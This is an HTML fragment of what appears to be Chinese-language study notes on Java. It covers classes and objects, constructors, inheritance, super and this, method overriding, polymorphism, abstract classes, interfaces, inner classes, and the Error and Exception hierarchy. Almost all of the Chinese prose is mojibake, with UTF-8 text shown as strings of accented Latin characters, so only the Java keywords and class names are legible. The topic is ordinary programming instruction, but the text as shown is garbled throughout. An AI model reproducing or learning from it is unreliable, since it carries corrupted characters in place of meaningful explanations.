<li><strong>å¤šæ€</strong></li>
</ul>
</li>
<li>ä»è®¤è¯†è®ºè§’åº¦è€ƒè™‘æ˜¯å…ˆæœ‰å¯¹è±¡åæœ‰ç±»ã€‚å¯¹è±¡ï¼Œæ˜¯å…·ä½“çš„äº‹ç‰©ã€‚ç±»ï¼Œæ˜¯æŠ½è±¡çš„ï¼Œæ˜¯å¯¹å¯¹è±¡çš„æŠ½è±¡ã€‚</li>
<li>ä»ä»£ç è¿è¡Œè§’åº¦è€ƒè™‘æ˜¯å…ˆæœ‰ç±»åæœ‰å¯¹è±¡ã€‚ç±»æ˜¯å¯¹è±¡çš„æ¨¡æ¿ã€‚</li>
</ul>
<h3 id="2ã€æ–¹æ³•çš„å›é¡¾å’ŒåŠ æ·±"><a href="#2ã€æ–¹æ³•çš„å›é¡¾å’ŒåŠ æ·±" class="headerlink" title="2ã€æ–¹æ³•çš„å›é¡¾å’ŒåŠ æ·±"></a>2ã€æ–¹æ³•çš„å›é¡¾å’ŒåŠ æ·±</h3><ul>
<li><p>æ–¹æ³•çš„å®šä¹‰</p>
<ul>
<li>ä¿®é¥°ç¬¦</li>
<li>è¿”å›ç±»å‹</li>
<li>breakï¼šè·³å‡º switchï¼Œç»“æŸå¾ªç¯å’Œ returnçš„åŒºåˆ«ã€‚</li>
<li>æ–¹æ³•åï¼šæ³¨æ„è§„èŒƒå°±OKï¼Œè§åçŸ¥æ„</li>
<li>å‚æ•°åˆ—è¡¨ï¼š(å‚æ•°ç±»å‹ï¼Œå‚æ•°å) â€¦</li>
<li>å¼‚å¸¸æŠ›å‡ºï¼šç–‘é—®ï¼Œå‚è€ƒä¸‹æ–‡ï¼</li>
</ul>
</li>
<li><p>æ–¹æ³•çš„è°ƒç”¨</p>
<ul>
<li>é™æ€æ–¹æ³•ï¼ˆå¯ä»¥ç›´æ¥è°ƒç”¨ï¼‰</li>
<li>éé™æ€æ–¹æ³•ï¼ˆéœ€è¦newå¯¹è±¡æ‰èƒ½è°ƒç”¨ï¼‰</li>
<li>å½¢å‚å’Œå®å‚</li>
<li>å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</li>
<li>thiså…³é”®å­—ï¼ˆè¡¨ç¤ºå½“å‰æ‰€åœ¨ç±»ï¼‰</li>
</ul>
</li>
</ul>
<h3 id="3ã€å¯¹è±¡çš„åˆ›å»ºåˆ†æ"><a href="#3ã€å¯¹è±¡çš„åˆ›å»ºåˆ†æ" class="headerlink" title="3ã€å¯¹è±¡çš„åˆ›å»ºåˆ†æ"></a>3ã€å¯¹è±¡çš„åˆ›å»ºåˆ†æ</h3><ul>
<li>ç±»æ˜¯ä¸€ç§æŠ½è±¡çš„æ•°æ®ç±»å‹å®ƒæ˜¯å¯¹æŸä¸€ç±»äº‹ç‰©æ•´ä½“æè¿°&#x2F;å®šä¹‰ä½†æ˜¯å¹¶ä¸èƒ½ä»£è¡¨æŸä¸€ä¸ªå…·ä½“çš„äº‹ç‰©ã€‚</li>
<li>ä½¿ç”¨newå…³é”®å­—åˆ›å»ºå¯¹è±¡ã€‚</li>
<li>ä½¿ç”¨newå…³é”®å­—åˆ›å»ºçš„æ—¶å€™ï¼Œé™¤äº†åˆ†é…å†…å­˜ç©ºé—´ä¹‹å¤–ï¼Œè¿˜ä¼šç»™åˆ¨å»ºå¥½çš„å¯¹è±¡è¿›è¡Œé»˜è®¤çš„åˆå§‹åŒ–ä»¥åŠå¯¹ç±»ä¸­æ„é€ å™¨çš„è°ƒç”¨ã€‚</li>
<li>ç±»ä¸­çš„æ„é€ å™¨ä¹Ÿç§°ä¸ºæ„é€ æ–¹æ³•ï¼Œæ˜¯åœ¨è¿›è¡Œåˆ›å»ºå¯¹è±¡çš„æ—¶å€™å¿…é¡»è¦è°ƒç”¨çš„ã€‚å¹¶ä¸”æ„é€ å™¨æœ‰ä»¥ä¸‹ä¿©ä¸ªç‰¹ç‚¹ï¼š<ul>
<li>1.å¿…é¡»å’Œç±»çš„åå­—ç›¸åŒï¼›</li>
<li>2.å¿…é¡»æ²¡æœ‰è¿”å›ç±»å‹ä¹Ÿä¸èƒ½å†™voidã€‚</li>
</ul>
</li>
<li>æ„é€ å™¨ï¼š<ul>
<li>1.å’Œç±»ååˆé—®</li>
<li>2.æ²¡æœ‰è¿”å›å€¼</li>
</ul>
</li>
<li>ä½œç”¨ï¼š<ul>
<li>1.newæœ¬è´¨åœ¨è°ƒç”¨æ„é€ æ–¹æ³•ï¼›</li>
<li>2.åˆå§‹åŒ–å¯¹è±¡çš„å€¼ã€‚</li>
</ul>
</li>
<li>æ³¨æ„ï¼šå®šä¹‰æœ‰å‚æ„é€ ä¹‹åï¼Œå¦‚æœæƒ³ä½¿ç”¨æ— å‚æ„é€ ï¼Œæ˜¾ç¤ºçš„å®šä¹‰ä¸€ä¸ªæ— å‚æ„é€ ã€‚</li>
</ul>
<h3 id="4ã€é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§"><a href="#4ã€é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§" class="headerlink" title="4ã€é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§"></a>4ã€é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</h3><blockquote>
<p>å°è£…ï¼š<strong>å±æ€§ç§æœ‰ï¼Œget&#x2F;set</strong></p>
</blockquote>
<p>å°è£…çš„ä½œç”¨ï¼š</p>
<ul>
<li>æé«˜äº†ä»£ç çš„å®‰å…¨æ€§ï¼Œä¿æŠ¤æ•°æ®ï¼›</li>
<li>éšè—ä»£ç çš„å®ç°ç»†åˆ™ï¼›</li>
<li>ç»Ÿä¸€æ¥å£ï¼›</li>
<li>ç³»ç»Ÿå¯ç»´æŠ¤å¢åŠ äº†ã€‚</li>
</ul>
<blockquote>
<p>ç»§æ‰¿ï¼š<strong>objectç±»ã€superã€æ–¹æ³•é‡å†™</strong></p>
</blockquote>
<ul>
<li>ç»§æ‰¿çš„æœ¬è´¨æ˜¯å¯¹æŸä¸€æ‰¹ç±»çš„æŠ½è±¡ï¼Œä»è€Œå®ç°å¯¹ç°å®ä¸–ç•Œæ›´å¥½çš„å»ºæ¨¡ã€‚</li>
<li>extandsçš„æ„æ€æ˜¯â€œæ‰©å±•â€ã€‚å­ç±»æ˜¯çˆ¶ç±»çš„æ‰©å±•ã€‚</li>
<li><strong>JAVAä¸­ç±»åªæœ‰å•ç»§æ‰¿ï¼Œæ²¡æœ‰å¤šç»§æ‰¿ï¼</strong></li>
<li>ç»§æ‰¿æ˜¯ç±»å’Œç±»ä¹‹é—´çš„ä¸€ç§å…³ç³»ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç±»å’Œç±»ä¹‹é—´çš„å…³ç³»è¿˜æœ‰ä¾èµ–ã€ç»„åˆã€èšåˆç­‰ã€‚</li>
<li>ç»§æ‰¿å…³ç³»çš„ä¿©ä¸ªç±»ï¼Œä¸€ä¸ªä¸ºå­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ï¼Œä¸€ä¸ªä¸ºçˆ¶ç±»ï¼ˆåŸºç±»ï¼‰ã€‚å­ç±»ç»§æ‰¿çˆ¶ç±»ä½¿ç”¨å…³é”®å­— extendsæ¥è¡¨ç¤ºã€‚</li>
<li>å­ç±»å’Œçˆ¶ç±»ä¹‹é—´ä»æ„ä¹‰ä¸Šè®²åº”è¯¥å…·æœ‰â€is aâ€çš„å…³ç³»ã€‚</li>
<li>ç§æœ‰çš„ä¸œè¥¿æ— æ³•è¢«ç»§æ‰¿ï¼ï¼ï¼</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">superæ³¨æ„ç‚¹ï¼š</span><br><span class="line"></span><br><span class="line">1. superè°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œå¿…é¡»åœ¨æ„é€ æ–¹æ³•çš„ç¬¬ä¸€ä¸ª</span><br><span class="line">2. superå¿…é¡»åªèƒ½å‡ºç°åœ¨å­ç±»çš„æ–¹æ³•æˆ–è€…æ„é€ æ–¹æ³•ä¸­ï¼</span><br><span class="line">3. superå’Œthisä¸èƒ½åŒæ—¶è°ƒç”¨æ„é€ æ–¹æ³•ï¼</span><br><span class="line"></span><br><span class="line">super VS this</span><br><span class="line">- ä»£è¡¨çš„å¯¹è±¡ä¸åŒï¼š</span><br><span class="line">  - thisï¼šæœ¬èº«è°ƒç”¨è€…è¿™ä¸ªå¯¹è±¡ï¼›</span><br><span class="line">  - superï¼šä»£è¡¨çˆ¶ç±»å¯¹è±¡çš„åº”ç”¨ï¼›</span><br><span class="line">- å‰æ</span><br><span class="line">  - thisï¼šæ²¡æœ‰ç»§æ‰¿ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼›</span><br><span class="line">  - superï¼šåªèƒ½åœ¨ç»§æ‰¿æ¡ä»¶æ‰å¯ä»¥ä½¿ç”¨ï¼›</span><br><span class="line">- æ„é€ æ–¹æ³•</span><br><span class="line">  - thisï¼ˆï¼‰ï¼šæœ¬ç±»çš„æ„é€ ï¼›</span><br><span class="line">  - superï¼ˆï¼‰ï¼šçˆ¶ç±»çš„æ„é€ ã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ–¹æ³•çš„é‡å†™</p>
</li>
<li><p>é‡å†™ï¼šéœ€è¦æœ‰ç»§æ‰¿å…³ç³»ï¼Œå­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼</p>
</li>
</ul>
<ol>
<li>æ–¹æ³•åå¿…é¡»ç›¸åŒ;</li>
<li>å‚æ•°åˆ—è¡¨åˆ—è¡¨å¿…é¡»ç›¸åŒ;</li>
<li>ä¿®é¥°ç¬¦ï¼šèŒƒå›´å¯ä»¥æ‰©å¤§ä½†ä¸èƒ½ç¼©å°: public&gt;Protected&gt;Default&gt;private</li>
<li>æŠ›å‡ºçš„å¼‚å¸¸ï¼šèŒƒå›´ï¼Œå¯ä»¥è¢«ç¼©å°ï¼Œä½†ä¸èƒ½æ‰©å¤§ï¼›ClassNotFoundExceptionâ€“&gt; Exception(å¤§)</li>
</ol>
<ul>
<li>é‡å†™ï¼Œå­ç±»çš„æ–¹æ³•å’Œçˆ¶ç±»å¿…è¦ä¸€è‡´ï¼›æ–¹æ³•ä½“ä¸åŒï¼</li>
<li>ä¸ºä»€ä¹ˆéœ€è¦é‡å†™ï¼šçˆ¶ç±»çš„åŠŸèƒ½ï¼Œå­ç±»ä¸ä¸€å®šéœ€è¦ï¼Œæˆ–è€…ä¸ä¸€å®šæ»¡è¶³ï¼</li>
</ul>
<blockquote>
<p>å¤šæ€</p>
</blockquote>
<ul>
<li>å³åŒä¸€æ–¹æ³•å¯ä»¥æ ¹æ®å‘é€å¯¹è±¡çš„ä¸åŒè€Œé‡‡ç”¨å¤šç§ä¸åŒçš„è¡Œä¸ºæ–¹å¼ã€‚</li>
<li>ä¸€ä¸ªå¯¹è±¡çš„å®é™…ç±»å‹æ˜¯ç¡®å®šçš„ï¼Œä½†å¯ä»¥æŒ‡å‘å¯¹è±¡çš„å¼•ç”¨çš„ç±»å‹æœ‰å¾ˆå¤šã€‚</li>
<li>å¤šæ€å­˜åœ¨çš„æ¡ä»¶ï¼š<ul>
<li>æœ‰ç»§æ‰¿å…³ç³»ï¼›</li>
<li>å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•ï¼›</li>
<li>çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- å¤šæ€æ³¨æ„äº‹é¡¹ï¼š</span><br><span class="line">  1. å¤šæ€æ˜¯æ–¹æ³•çš„å¤šæ€ï¼Œå±æ€§æ²¡æœ‰å¤šæ€ï¼›</span><br><span class="line">  2. çˆ¶ç±»å’Œå­ç±»ï¼Œæœ‰è”ç³»ï¼Œç±»å‹è½¬æ¢å¼‚å¸¸ï¼ClassCastException!</span><br><span class="line">  3. å­˜åœ¨æ¡ä»¶ï¼šç»§æ‰¿æ¡ä»¶ï¼Œæ–¹æ³•éœ€è¦é‡å†™ï¼çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ï¼</span><br><span class="line">     1. static æ–¹æ³•ï¼Œå±äºç±»ï¼Œå®ƒä¸å±äºå®ä¾‹</span><br><span class="line">     2. final å¸¸é‡ï¼›</span><br><span class="line">     3. private æ–¹æ³•ï¼›</span><br><span class="line"></span><br><span class="line">instanceofï¼šåˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯ä»€ä¹ˆç±»å‹ã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li>åŒ¿åä»£ç å—<ul>
<li>åœ¨ç±»åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œ</li>
<li>åœ¨æ„é€ æ–¹æ³•å‰æ‰§è¡Œï¼Œåœ¨é™æ€ä»£ç å—åæ‰§è¡Œ</li>
</ul>
</li>
<li>é™æ€ä»£ç å—<ul>
<li>åªä¼šåœ¨ç±»åˆæ¬¡åˆ›å»ºå¯¹è±¡æ—¶æ‰§è¡Œ</li>
<li>åœ¨æ„é€ æ–¹æ³•ã€é™æ€ä»£ç å—å‰æ‰§è¡Œ</li>
</ul>
</li>
</ul>
<h3 id="5ã€æŠ½è±¡ç±»å’Œæ¥å£"><a href="#5ã€æŠ½è±¡ç±»å’Œæ¥å£" class="headerlink" title="5ã€æŠ½è±¡ç±»å’Œæ¥å£"></a>5ã€æŠ½è±¡ç±»å’Œæ¥å£</h3><blockquote>
<p>æŠ½è±¡ç±»</p>
</blockquote>
<ul>
<li>abstractä¿®é¥°ç¬¦å¯ä»¥ç”¨æ¥ä¿®é¥°æ–¹æ³•ä¹Ÿå¯ä»¥ä¿®é¥°ç±»å¦‚æœä¿®é¥°æ–¹æ³•é‚£ä¹ˆè¯¥æ–¹æ³•å°±æ˜¯æŠ½è±¡æ–¹æ³•å¦‚æœä¿®é¥°ç±»é‚£ä¹ˆè¯¥ç±»å°±æ˜¯æŠ½è±¡ç±»ã€‚</li>
<li>æŠ½è±¡ç±»ä¸­å¯ä»¥æ²¡æœ‰æŠ½è±¡æ–¹æ³•ä½†æ˜¯æœ‰æŠ½è±¡æ–¹æ³•çš„ç±»ä¸€å®šè¦å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</li>
<li>æŠ½è±¡ç±»ï¼Œä¸èƒ½ä½¿ç”¨newå…³é”®å­—æ¥åˆ›å»ºå¯¹è±¡å®ƒæ˜¯ç”¨æ¥è®©å­ç±»ç»§æ‰¿çš„ã€‚</li>
<li>æŠ½è±¡æ–¹æ³•åªæœ‰æ–¹æ³•çš„å£°æ˜æ²¡æœ‰æ–¹æ³•çš„å®ç°å®ƒæ˜¯ç”¨æ¥è®©å­ç±»å®ç°çš„ã€‚</li>
<li>å­ç±»ç»§æ‰¿æŠ½è±¡ç±»é‚£ä¹ˆå°±å¿…é¡»è¦å®ç°æŠ½è±¡ç±»æ²¡æœ‰å®ç°çš„æŠ½è±¡æ–¹æ³•å¦åˆ™è¯¥å­ç±»ä¹Ÿè¦å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</li>
</ul>
<blockquote>
<p>æ¥å£</p>
</blockquote>
<ul>
<li>æ™®é€šç±»ï¼šåªæœ‰å…·ä½“å®ç°ï¼›</li>
<li>æŠ½è±¡ç±»ï¼šå…·ä½“å®ç°å’Œè§„èŒƒï¼ˆæŠ½è±¡æ–¹æ³•ï¼‰éƒ½æœ‰ï¼</li>
<li>æ¥å£ï¼šåªæœ‰è§„èŒƒï¼</li>
<li>æ¥å£å°±æ˜¯è§„èŒƒï¼Œå®šä¹‰çš„æ˜¯ä¸€ç»„è§„åˆ™ï¼Œä½“ç°äº†ç°å®ä¸–ç•Œä¸­â€œå¦‚æœä½ æ˜¯â€¦åˆ™å¿…é¡»èƒ½â€¦â€çš„æ€æƒ³ã€‚å¦‚æœä½ æ˜¯å¤©ä½¿ï¼Œåˆ™å¿…é¡»èƒ½é£ã€‚å¦‚æœä½ æ˜¯æ±½è½¦ï¼Œåˆ™å¿…é¡»èƒ½è·‘ã€‚å¦‚æœä½ å¥½äººï¼Œåˆ™å¿…é¡»å¹²æ‰åäººï¼›å¦‚æœä½ æ˜¯åäººï¼Œåˆ™å¿…é¡»æ¬ºè´Ÿå¥½äººã€‚</li>
<li>æ¥å£çš„æœ¬è´¨æ˜¯å¥‘çº¦ï¼Œå°±åƒæˆ‘ä»¬äººé—´çš„æ³•å¾‹ä¸€æ ·ã€‚åˆ¶å®šå¥½åå¤§å®¶éƒ½éµå®ˆã€‚</li>
<li>OOçš„ç²¾é«“ï¼Œæ˜¯å¯¹å¯¹è±¡çš„æŠ½è±¡ï¼Œæœ€èƒ½ä½“ç°è¿™ä¸€ç‚¹çš„å°±æ˜¯æ¥å£ã€‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è®¨è®ºè®¾è®¡æ¨¡å¼éƒ½åªé’ˆå¯¹å…·å¤‡äº†æŠ½è±¡èƒ½åŠ›çš„è¯­è¨€ï¼ˆæ¯”å¦‚c++ã€javaã€c#ç­‰ï¼‰ï¼Œå°±æ˜¯å› ä¸ºè®¾è®¡æ¨¡å¼æ‰€ç¡ç©¶çš„ï¼Œå®é™…ä¸Šå°±æ˜¯å¦‚ä½•åˆç†çš„å»æŠ½è±¡ã€‚</li>
<li><strong>å£°æ˜ç±»çš„å…³é”®å­—æ˜¯ classï¼Œå£°æ˜æ¥å£çš„å…³é”®å­—æ˜¯ interfaceã€‚</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŠ½è±¡ç±»å’Œæ¥å£çš„åŒºåˆ«ï¼š</span><br><span class="line">- æŠ½è±¡ç±»ï¼šå…·ä½“å®ç°å’Œè§„èŒƒï¼ˆæŠ½è±¡æ–¹æ³•ï¼‰éƒ½æœ‰ï¼</span><br><span class="line">- æ¥å£ï¼šåªæœ‰è§„èŒƒï¼</span><br></pre></td></tr></table></figure>

<h3 id="6ã€å†…éƒ¨ç±»åŠOOPå®æˆ˜"><a href="#6ã€å†…éƒ¨ç±»åŠOOPå®æˆ˜" class="headerlink" title="6ã€å†…éƒ¨ç±»åŠOOPå®æˆ˜"></a>6ã€å†…éƒ¨ç±»åŠOOPå®æˆ˜</h3><p>å†…éƒ¨ç±»å°±æ˜¯åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨åœ¨å®šä¹‰ä¸€ä¸ªç±»ï¼Œæ¯”å¦‚ï¼ŒAç±»ä¸­å®šä¹‰ä¸€ä¸ªBç±»ï¼Œé‚£ä¹ˆBç±»ç›¸å¯¹Aç±»æ¥è¯´å°±ç§°ä¸ºå†…éƒ¨ç±»ï¼Œè€ŒAç±»ç›¸å¯¹Bç±»æ¥è¯´å°±æ˜¯å¤–éƒ¨ç±»äº†ã€‚</p>
<ol>
<li>æˆå‘˜å†…éƒ¨ç±»</li>
<li>é™æ€å†…éƒ¨ç±»</li>
<li>å±€éƒ¨å†…éƒ¨ç±»</li>
<li>åŒ¿åå†…éƒ¨ç±»</li>
</ol>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-16/0305cc69a3803b657b001f20616fefc2--0f4e--image-20240916221855128.png" alt="image-20240916221855128"></p>
<h2 id="å¼‚å¸¸"><a href="#å¼‚å¸¸" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h2><h3 id="1ã€ä»€ä¹ˆæ˜¯å¼‚å¸¸"><a href="#1ã€ä»€ä¹ˆæ˜¯å¼‚å¸¸" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯å¼‚å¸¸"></a>1ã€ä»€ä¹ˆæ˜¯å¼‚å¸¸</h3><pre><code> å®é™…å·¥ä½œä¸­ï¼Œé‡åˆ°çš„æƒ…å†µä¸å¯èƒ½æ˜¯éå¸¸å®Œç¾çš„ã€‚æ¯”å¦‚ï¼šä½ å†™çš„æŸä¸ªæ¨¡å—ï¼Œç”¨æˆ·è¾“å…¥ä¸ä¸€å®šç¬¦åˆä½ çš„è¦æ±‚ã€ä½ çš„ç¨‹åºè¦æ‰“å¼€æŸä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½ä¸å­˜åœ¨æˆ–è€…æ–‡ä»¶æ ¼å¼ä¸å¯¹ï¼Œä½ è¦è¯»å–æ•°æ®åº“çš„æ•°æ®ï¼Œæ•°æ®å¯èƒ½æ˜¯ç©ºçš„ç­‰ã€‚æˆ‘ä»¬çš„ç¨‹åºå†è·‘ç€ï¼Œå†…å­˜æˆ–ç¡¬ç›˜å¯èƒ½æ»¡äº†ã€‚ç­‰ç­‰ã€‚
</code></pre>
<p> &nbsp;  &nbsp; è½¯ä»¶ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œéå¸¸å¯èƒ½é‡åˆ°åˆšåˆšæåˆ°çš„è¿™äº›å¼‚å¸¸é—®é¢˜ï¼Œæˆ‘ä»¬å«å¼‚å¸¸ï¼Œè‹±æ–‡æ˜¯ï¼šExceptionï¼Œæ„æ€æ˜¯ä¾‹å¤–ã€‚è¿™äº›ï¼Œä¾‹å¤–æƒ…å†µï¼Œæˆ–è€…å«å¼‚å¸¸ï¼Œæ€ä¹ˆè®©æˆ‘ä»¬å†™çš„ç¨‹åºåšå‡ºåˆç†çš„å¤„ç†ã€‚è€Œä¸è‡³äºç¨‹åºå´©æºƒã€‚</p>
<p> &nbsp;  &nbsp; å¼‚å¸¸æŒ‡ç¨‹åºè¿è¡Œä¸­å‡ºç°çš„ä¸æœŸè€Œè‡³çš„å„ç§çŠ¶å†µå¦‚ï¼šæ–‡ä»¶æ‰¾ä¸åˆ°ã€ç½‘ç»œè¿æ¥å¤±è´¥ã€éæ³•å‚æ•°ç­‰ã€‚å¼‚å¸¸å‘ç”Ÿåœ¨ç¨‹åºè¿è¡ŒæœŸé—´å®ƒå½±å“äº†æ­£å¸¸çš„ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚</p>
<blockquote>
<p>è¦ç†è§£Javaå¼‚å¸¸å¤„ç†æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œéœ€è¦æŒæ¡ä»¥ä¸‹ä¸‰ç§ç±»å‹çš„å¼‚å¸¸</p>
</blockquote>
<ul>
<li>æ£€æŸ¥æ€§å¼‚å¸¸ï¼šæœ€å…·ä»£è¡¨çš„æ£€æŸ¥æ€§å¼‚å¸¸æ—¶ç”¨æˆ·é”™è¯¯æˆ–é—®é¢˜å¼•èµ·çš„å¼‚å¸¸ï¼Œ</li>
<li>è¿™æ˜¯ç¨‹åºå‘˜æ— æ³•é¢„è§çš„ä¾‹å¦‚è¦æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨æ–‡ä»¶æ—¶ï¼Œä¸€ä¸ªå¼‚å¸¸å°±å‘ç”Ÿäº†ï¼Œè¿™äº›å¼‚å¸¸åœ¨ç¼–è¯‘æ—¶ä¸èƒ½è¢«ç®€å•åœ°å¿½ç•¥ã€‚</li>
<li>è¿è¡Œæ—¶å¼‚å¸¸ï¼šè¿è¡Œæ—¶å¼‚å¸¸æ˜¯å¯èƒ½è¢«ç¨‹åºå‘˜é¿å…çš„å¼‚å¸¸ã€‚ä¸æ£€æŸ¥æ€§å¼‚å¸¸ç›¸åï¼Œè¿è¡Œæ—¶å¼‚å¸¸å¯ä»¥åœ¨ç¼–è¯‘æ—¶è¢«å¿½ç•¥ã€‚</li>
<li>é”™è¯¯<strong>ERROR</strong>ï¼šé”™è¯¯ä¸æ˜¯å¼‚å¸¸ï¼Œè€Œæ˜¯è„±ç¦»ç¨‹åºå‘˜æ§åˆ¶çš„å†‹é¢˜ã€‚é”™è¯¯åœ¨ä»£ç ä¸­é€šå¸¸è¢«å¿½ç•¥ã€‚ä¾‹å¦‚ï¼Œå½“æ ˆæº¢å‡ºæ—¶ï¼Œä¸€ä¸ªé”™è¯¯å°±å‘ç”Ÿäº†ï¼Œå®ƒä»¬åœ¨ç¼–è¯‘ä¹Ÿæ£€æŸ¥ä¸åˆ°çš„ã€‚</li>
</ul>
<h3 id="2ã€å¼‚å¸¸ä½“ç³»ç»“æ„"><a href="#2ã€å¼‚å¸¸ä½“ç³»ç»“æ„" class="headerlink" title="2ã€å¼‚å¸¸ä½“ç³»ç»“æ„"></a>2ã€å¼‚å¸¸ä½“ç³»ç»“æ„</h3><ul>
<li>JavaæŠŠå¼‚å¸¸å½“ä¸ºå¯¹è±¡æ¥å¤„ç†ï¼Œå¹¶å®šä¹‰ä¸€ä¸ªåŸºç±» java. lang.Throwableä½œä¸ºæ‰€æœ‰å¼‚å¸¸çš„è¶…ç±»ã€‚</li>
<li>åœ¨ Java APIä¸­å·²ç»å®šä¹‰äº†è®¸å¤šå¼‚å¸¸ç±»ï¼Œè¿™äº›å¼‚å¸¸ç±»åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œé”™è¯¯Errorå’Œå¼‚å¸¸ Exceptionã€‚<img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/9dad4dc296387a3aa745bda588e541a0--66fb--1622843400375.png" alt="1622843400375"></li>
</ul>
<blockquote>
<p>Error</p>
</blockquote>
<ul>
<li>Errorç±»å¯¹è±¡ç”±Javaè™šæ‹Ÿæœºç”Ÿæˆå¹¶æŠ›å‡ºï¼Œå¤§å¤šæ•°é”™è¯¯ä¸ä»£ç ç¼–å†™è€…æ‰€æ‰§è¡Œçš„æ“ä½œæ— å…³ã€‚</li>
<li>Javaè™šæ‹Ÿæœºè¿è¡Œé”™è¯¯ï¼ˆ Virtual Machine Errorï¼‰ï¼Œå½“JVMä¸å†æœ‰ç»§ç»­æ‰§è¡Œæ“ä½œæ‰€éœ€çš„å†…å­˜èµ„æºæ—¶ï¼Œå°†å‡ºç° <strong>OutofMemory Errorï¼ˆOOMå†…å­˜æº¢å‡ºï¼‰</strong>ã€‚è¿™äº›å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒJavaè™šæ‹Ÿæœºï¼ˆJVMï¼‰ä¸€èˆ¬ä¼šé€‰æ‹©çº¿ç¨‹ç»ˆæ­¢ã€‚</li>
<li>è¿˜æœ‰å‘ç”Ÿåœ¨è™›æ‹Ÿæœºè¯•å›¾æ‰§è¡Œåº”ç”¨æ—¶ï¼Œå¦‚ç±»å®šä¹‰é”™è¯¯ï¼ˆ NoClass Deffound errorï¼‰ã€é“¾æ¥é”™è¯¯ï¼ˆ Linkage Errorï¼‰ã€‚è¿™äº›é”™è¯¯æ˜¯ä¸å¯æŸ¥çš„ï¼Œå› ä¸ºå®ƒä»¬åœ¨åº”ç”¨ç¨‹åºçš„æ§åˆ¶å’Œå¤„ç†èƒ½åŠ›ä¹‹å¤–ï¼Œè€Œä¸”ç»å¤§å¤šæ•°æ˜¯ç¨‹åºè¿è¡Œæ—¶ä¸å…è®¸å‡ºç°çš„çŠ¶å†µã€‚</li>
</ul>
<blockquote>
<p>Exception</p>
</blockquote>
<ul>
<li>åœ¨ Exceptionåˆ†æ”¯ä¸­æœ‰ä¸€ä¸ªé‡è¦çš„å­ç±» Runtime Exceptionï¼ˆè¿è¡Œæ—¶å¼‚å¸¸ï¼‰<ul>
<li>ArraylndexOutOfBoundsExceptionï¼ˆæ•°ç»„ä¸‹æ ‡è¶Šç•Œï¼‰</li>
<li>NullPointerExceptionï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰</li>
<li>ArithmeticExceptionï¼ˆç®—æœ¯å¼‚å¸¸ï¼‰</li>
<li>Missing Resource Exceptionï¼ˆä¸¢å¤±èµ„æºï¼‰</li>
<li>ClassNotFound Exceptionï¼ˆæ‰¾ä¸åˆ°ç±»ï¼‰ç­‰å¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸æ˜¯ä¸æ£€æŸ¥å¼‚å¸¸ï¼Œç¨‹åºä¸­å¯ä»¥é€‰æ‹©æ•è·å¤„ç†ï¼Œä¹Ÿå¯ä»¥ä¸å¤„ç†ã€‚</li>
</ul>
</li>
<li>è¿™äº›å¼‚å¸¸ä¸€èˆ¬æ˜¯ç”±ç¨‹åºé€»è¾‘é”™è¯¯å¼•èµ·çš„ï¼Œç¨‹åºåº”è¯¥ä»é€»è¾‘è§’åº¦å°½å¯èƒ½é¿å…è¿™ç±»å¼‚å¸¸çš„å‘ç”Ÿï¼› </li>
<li>Errorå’Œ Exceptionçš„åŒºåˆ«ï¼šErroré€šå¸¸æ˜¯ç¾éš¾æ€§çš„è‡´å‘½çš„é”™è¯¯ï¼Œæ˜¯ç¨‹åºæ— æ³•æ§åˆ¶å’Œå¤„ç†çš„ï¼Œå½“å‡ºç°è¿™äº›å¼‚å¸¸æ—¶ï¼ŒJavaè™›æ‹Ÿæœºï¼ˆJVMï¼‰ä¸€èˆ¬ä¼šé€‰æ‹©ç»ˆæ­¢çº¿ç¨‹ï¼›Exceptioné€šå¸¸æƒ…å†µä¸‹æ˜¯å¯ä»¥è¢«ç¨‹åºå¤„ç†çš„ï¼Œå¹¶ä¸”åœ¨ç¨‹åºä¸­åº”è¯¥å°½å¯èƒ½çš„å»å¤„ç†è¿™äº›å¼‚å¸¸ã€‚</li>
</ul>
